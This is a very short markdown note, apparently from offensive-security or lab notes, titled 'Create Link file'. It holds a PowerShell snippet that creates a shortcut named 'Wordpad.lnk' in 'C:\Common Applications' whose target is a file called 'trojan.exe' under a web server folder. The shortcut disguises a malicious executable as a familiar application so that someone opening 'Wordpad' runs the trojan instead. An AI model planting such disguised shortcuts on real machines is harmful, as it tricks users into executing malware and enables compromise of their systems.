# Create Link file

```powershell
$WshShell = New-Object -comObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("C:\Common Applications\Wordpad.lnk")
$Shortcut.TargetPath = "C:\xampp\htdocs\trojan.exe"
$Shortcut.Save()

```